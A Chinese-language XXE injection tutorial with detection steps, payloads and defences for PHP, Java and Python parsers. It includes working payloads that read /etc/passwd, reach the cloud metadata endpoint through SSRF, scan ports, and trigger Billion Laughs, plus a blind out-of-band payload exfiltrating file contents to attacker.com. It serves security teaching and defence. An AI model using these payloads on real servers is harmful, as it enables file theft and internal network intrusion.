# XML 外部实体注入 (XXE)

> XML 外部实体注入（XML External Entity，XXE）是一种针对解析 XML 输入的应用程序的攻击类型，它允许攻击者利用 XML 实体处理漏洞。XML 实体可用于指示 XML 解析器获取服务器上的特定内容。

## 目录

- [工具](#工具)
- [漏洞检测](#漏洞检测)
- [利用 XXE 读取文件](#利用-xxe-读取文件)
    - [经典 XXE](#经典-xxe)
    - [Base64 编码的 XXE](#base64-编码的-xxe)
    - [XXE 盲注](#xxe-盲注)
- [XXE 攻击场景](#xxe-攻击场景)
- [防御措施](#防御措施)
- [学习资源](#学习资源)

## 什么是 XXE？

XML 外部实体注入（XXE）是一种安全漏洞，当应用程序解析用户提供的 XML 输入时，未正确配置 XML 解析器，导致攻击者能够读取服务器上的任意文件、执行服务器端请求伪造（SSRF）攻击、端口扫描内部系统等。

## 漏洞检测

### 基本检测

1. **检查 XML 处理**
   - 查找接受 XML 输入的功能点
   - 检查文件上传功能是否处理 XML 文件
   - 检查 SOAP 请求和响应

2. **简单测试**
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE test [ <!ENTITY xxe "test"> ]>
   <test>&xxe;</test>
   ```

3. **检测外部实体**
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE test [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <test>&xxe;</test>
   ```

## 利用 XXE 读取文件

### 经典 XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### Base64 编码的 XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>
```

### XXE 盲注

当响应中不直接显示文件内容时，可以使用带外技术（OOB）提取数据：

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
```

`evil.dtd` 内容：
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

## XXE 攻击场景

### 1. 读取本地文件
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
```

### 2. 服务器端请求伪造 (SSRF)
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>
```

### 3. 端口扫描
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22">
]>
<data>&xxe;</data>
```

### 4. 拒绝服务 (Billion Laughs)
```xml
<!DOCTYPE data [
  <!ENTITY a "lol">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<data>&d;</data>
```

## 文件上传中的 XXE

许多应用程序（如Word、Excel、SVG等）使用XML格式。攻击者可以创建恶意文档：

1. 创建一个包含XXE负载的Excel文件（.xlsx）：
   - 解压 .xlsx 文件
   - 修改 [Content_Types].xml 或 sheet1.xml
   - 重新压缩文件

2. 上传恶意文档并观察响应

## 防御措施

### 1. 禁用外部实体

#### PHP
```php
libxml_disable_entity_loader(true);
```

#### Java (DocumentBuilderFactory)
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

#### Python (lxml)
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
etree.parse(xml_source, parser=parser)
```

### 2. 输入验证
- 使用白名单验证XML输入
- 限制上传文件类型
- 验证XML内容

### 3. 使用较少的复杂配置
- 避免使用复杂的XML特性
- 使用JSON等替代格式

### 4. 使用API安全网关
- 部署WAF规则检测XXE攻击
- 监控异常请求

## 工具

- [XXEinjector](https://github.com/enjoiz/XXEinjector) - 自动化XXE漏洞利用工具
- [XXE Payload Generator](https://github.com/payloadbox/xxe-injection-payload-list) - XXE有效载荷生成器
- [OOB XXE Server](https://github.com/ONsec-Lab/xxe-ftp-server) - 带外XXE服务器
- [XXE-Scanner](https://github.com/0x48piraj/XXE-Scanner) - XXE漏洞扫描器

## 学习资源

- [OWASP XXE 防御指南](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger XXE 实验室](https://portswigger.net/web-security/xxe)
- [HackerOne XXE 报告](https://hackerone.com/hacktivity?querystring=xxe&order_direction=DESC&order_field=latest_disclosable_activity_at&filter=type%3Apublic)
- [XXE 攻击面](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files)

## 免责声明

本文档仅用于教育目的。请勿将其用于非法活动。在进行安全测试时，请确保您已获得适当的授权。

### 八、典型漏洞 YAML 文件分析

本目录及上级目录收录了多个与 XXE（XML 外部实体注入）相关的漏洞利用模板，以下对部分典型 YAML 文件进行详细解读：

#### 1. CVE-2020-24589.yaml
- **漏洞类型**：盲 XXE（WSO2 API Manager）
- **漏洞原理**：
  WSO2 API Manager 某接口未禁用外部实体，攻击者可注入恶意 XXE payload，导致服务器发起外部请求，泄露敏感信息。
- **探测原理**：
  该模板通过 POST 请求注入 XXE payload，若 interactsh 平台收到请求且响应包含特定错误提示，则判定存在漏洞。
- **修复建议**：升级 WSO2 API Manager，禁用 XML 外部实体。

#### 2. CVE-2021-27931.yaml
- **漏洞类型**：盲 XXE（LumisXP）
- **漏洞原理**：
  LumisXP 某接口未禁用外部实体，攻击者可注入 XXE payload，导致服务器发起外部请求，泄露敏感信息。
- **探测原理**：
  该模板通过 POST 请求注入 XXE payload，若 interactsh 平台收到请求，则判定存在漏洞。
- **修复建议**：升级 LumisXP，禁用 XML 外部实体。

---

#### 总结
XXE 漏洞常见于 XML 解析器未禁用外部实体的场景。攻击者可利用 XXE 读取服务器文件、发起 SSRF、拒绝服务等攻击。防御措施包括：
- 禁用 XML 解析器的外部实体功能
- 使用安全的 XML 解析库
- 严格校验和过滤上传的 XML 数据
